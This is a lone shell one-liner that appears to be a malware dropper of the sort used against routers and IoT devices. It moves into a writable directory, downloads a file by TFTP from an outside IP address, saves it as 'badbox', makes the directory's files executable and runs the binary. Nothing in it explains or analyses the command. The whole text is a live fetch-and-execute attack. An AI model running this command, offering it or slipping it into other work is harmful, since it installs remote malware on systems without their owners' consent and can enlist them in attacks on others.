cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 198.175.126.69;cat pftp >badbox;chmod +x *;./badbox
